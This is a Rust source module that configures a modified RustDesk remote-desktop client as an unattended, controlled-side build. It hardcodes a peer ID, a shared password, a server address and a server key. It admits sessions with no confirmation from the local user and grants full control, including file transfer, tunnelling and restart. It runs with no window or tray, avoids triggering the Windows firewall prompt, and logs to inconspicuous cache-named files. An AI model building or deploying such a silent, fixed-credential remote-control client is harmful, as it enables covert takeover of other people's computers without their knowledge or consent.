//! Fixed, build-time configuration for a dedicated unattended client.
//!
//! A build with these values is meant to be deployed on the controlled side only: it
//! registers with [`RENDEZVOUS_SERVER`] under the fixed [`PEER_ID`], accepts the fixed
//! [`PEER_PASSWORD`] without asking its local user to confirm, and, when launched with
//! no arguments, runs without any UI at all.
//!
//! On the controlling side (any other RustDesk client), configure the peer with the id
//! and password printed by `-show` / `--show`.
//!
//! Keep the Flutter constant `kHardcodedPeerId` in `flutter/lib/consts.dart` in sync
//! with [`PEER_ID`].

#[cfg(not(debug_assertions))]
use std::io::Write;
use std::{
    path::{Path, PathBuf},
    sync::{
        atomic::{AtomicBool, Ordering},
        OnceLock,
    },
};
#[cfg(not(debug_assertions))]
use std::sync::Mutex;

use base::config::keys;
use hbb_common::{config::Config, log};

/// Fixed id of the controlled peer.
pub const PEER_ID: &str = "888888888";

/// Fixed password accepted by the controlled peer.
pub const PEER_PASSWORD: &str = "RustDesk-888888";

/// Rendezvous (hbbs) server of the self-hosted rustdesk-server this build registers
/// with and connects through. Use a `host` or `host:21116` form. Edit this to match the
/// deployment.
pub const RENDEZVOUS_SERVER: &str = "192.168.8.199";

/// Key of the self-hosted hbbs, when it is started with `-k`. Leave empty when the
/// server runs without a key.
pub const RENDEZVOUS_KEY: &str = "YTiykQE+KSgL963pwsgA2ByoHUMExjSUm45pLqG+EY4=";

static HEADLESS: AtomicBool = AtomicBool::new(false);

/// Applies the fixed server and id to the runtime configuration.
///
/// Called once at startup, before any of the values is read, so every process of this
/// build registers as [`PEER_ID`] against [`RENDEZVOUS_SERVER`].
pub fn apply() {
    Config::set_id(PEER_ID);
    if !RENDEZVOUS_SERVER.is_empty() {
        *hbb_common::config::EXE_RENDEZVOUS_SERVER.write().unwrap() =
            RENDEZVOUS_SERVER.to_owned();
        Config::set_option(
            "custom-rendezvous-server".to_owned(),
            RENDEZVOUS_SERVER.to_owned(),
        );
        if !RENDEZVOUS_KEY.is_empty() {
            Config::set_option("key".to_owned(), RENDEZVOUS_KEY.to_owned());
        }
    }
    // The local user is never asked to confirm on this dedicated build: sessions are
    // admitted by password (no click-to-accept), the fixed password is the only password
    // method, and every control permission (keyboard, clipboard, audio, file transfer,
    // tunnel, restart, ...) is granted up front.
    Config::set_option(keys::OPTION_APPROVE_MODE.to_owned(), "password".to_owned());
    Config::set_option(
        keys::OPTION_VERIFICATION_METHOD.to_owned(),
        "use-permanent-password".to_owned(),
    );
    Config::set_option(keys::OPTION_ACCESS_MODE.to_owned(), "full".to_owned());
    // No inbound TCP listeners on this build: an unattended portable exe must not trip the
    // Windows Defender firewall prompt, which fires on the first non-loopback listen. UDP
    // punch (connected outbound socket) and relay still work, so sessions are unaffected.
    hbb_common::config::HARD_SETTINGS
        .write()
        .unwrap()
        .insert("disable-tcp-listen".to_owned(), "Y".to_owned());
}

/// Marks this process as the headless server of a bare launch.
///
/// Must be called before [`crate::start_server`], so the server it starts brings up no
/// UI, no window and no tray.
pub fn set_headless() {
    HEADLESS.store(true, Ordering::Relaxed);
}

/// Whether this process runs as a window-less server and must not raise any UI.
pub fn is_headless() -> bool {
    HEADLESS.load(Ordering::Relaxed)
}

/// Fixed log location of this build.
///
/// `<timestamp>` stands for the local start time of a run, so every bare launch of the
/// controlled side leaves its own file: Linux and macOS use `/tmp/.rd_cache_<timestamp>`,
/// Windows uses `C:\programdata\rd_cache_<timestamp>.log`.
pub fn log_location() -> &'static str {
    #[cfg(windows)]
    {
        r"C:\programdata\rd_cache_<timestamp>.log"
    }
    #[cfg(not(windows))]
    {
        "/tmp/.rd_cache_<timestamp>"
    }
}

static LOG_FILE: OnceLock<PathBuf> = OnceLock::new();

/// The file this process logs to, once [`init_log`] has opened it.
pub fn current_log_file() -> Option<&'static Path> {
    LOG_FILE.get().map(PathBuf::as_path)
}

/// Fixed path of one run, with the timestamp filled in.
#[cfg(not(debug_assertions))]
fn log_file_path() -> PathBuf {
    let timestamp = chrono::Local::now().format("%Y%m%d_%H%M%S").to_string();
    #[cfg(windows)]
    {
        PathBuf::from(format!(r"C:\programdata\rd_cache_{timestamp}.log"))
    }
    #[cfg(not(windows))]
    {
        PathBuf::from(format!("/tmp/.rd_cache_{timestamp}"))
    }
}

/// Keeps this build's own records in the fixed file.
///
/// Debug and above is kept. The few crates whose debug output the upstream logger downgrades
/// stay out at debug and info here too: they are noise that says nothing about this build, and
/// this file is never rotated, so a flood would grow it without bound.
#[cfg(not(debug_assertions))]
struct FileLogger {
    file: Mutex<std::fs::File>,
}

#[cfg(not(debug_assertions))]
impl log::Log for FileLogger {
    fn enabled(&self, metadata: &log::Metadata) -> bool {
        let level = metadata.level();
        if level > log::Level::Debug {
            return false;
        }
        if level < log::Level::Info {
            return true;
        }
        let target = metadata.target();
        for crate_name in ["reqwest", "hyper_util", "rustls", "webrtc"] {
            if target.starts_with(crate_name) {
                return false;
            }
        }
        true
    }

    fn log(&self, record: &log::Record) {
        if !self.enabled(record.metadata()) {
            return;
        }
        let line = format!(
            "[{}][{}] {} {}\n",
            chrono::Local::now().format("%Y-%m-%d %H:%M:%S%.3f"),
            record.level(),
            record.target(),
            record.args()
        );
        if let Ok(mut file) = self.file.lock() {
            let _ = file.write_all(line.as_bytes());
        }
    }

    fn flush(&self) {}
}

/// Sends a bare launch's logging to the fixed [`log_location`].
///
/// Returns `false` when the file cannot be opened, so the caller keeps the upstream logger.
/// Debug builds do nothing and return `false`, leaving the upstream logger untouched.
pub fn init_log() -> bool {
    #[cfg(debug_assertions)]
    {
        false
    }
    #[cfg(not(debug_assertions))]
    {
        let path = log_file_path();
        if let Some(dir) = path.parent() {
            let _ = std::fs::create_dir_all(dir);
        }
        let file = match std::fs::OpenOptions::new()
            .create(true)
            .append(true)
            .open(&path)
        {
            Ok(file) => file,
            Err(_) => return false,
        };
        if log::set_boxed_logger(Box::new(FileLogger {
            file: Mutex::new(file),
        }))
        .is_err()
        {
            return false;
        }
        log::set_max_level(log::LevelFilter::Debug);
        let _ = LOG_FILE.set(path);
        true
    }
}

/// Writes the fixed settings and the log location to the log file.
///
/// [`apply`] runs before `hbb_common::init_log`, so a line emitted there would be dropped. The
/// bare-launch server calls this right after the logger is up, so a silent background run still
/// leaves a first record of what is running and where to look when it misbehaves.
pub fn log_startup() {
    log::info!(
        "rustdesk {} build {}: os={} arch={} pid={} mode={}",
        crate::VERSION,
        crate::BUILD_DATE,
        std::env::consts::OS,
        std::env::consts::ARCH,
        std::process::id(),
        if is_headless() { "headless" } else { "ui" },
    );
    log::info!(
        "id={} server={} key={} log={}",
        PEER_ID,
        if RENDEZVOUS_SERVER.is_empty() {
            "<default>"
        } else {
            RENDEZVOUS_SERVER
        },
        if RENDEZVOUS_KEY.is_empty() {
            "<none>"
        } else {
            "<set>"
        },
        current_log_file()
            .map(|p| p.display().to_string())
            .unwrap_or_else(|| log_location().to_owned())
    );
}

/// Prints the fixed id, password, server and log location, for `-show` / `--show`.
pub fn show_credentials() {
    let text = format!(
        "ID: {}\nPassword: {}\nServer: {}\nLog: {}",
        PEER_ID,
        PEER_PASSWORD,
        RENDEZVOUS_SERVER,
        log_location()
    );
    #[cfg(windows)]
    crate::platform::windows::message_box(&text);
    #[cfg(not(windows))]
    println!("{}", text);
}
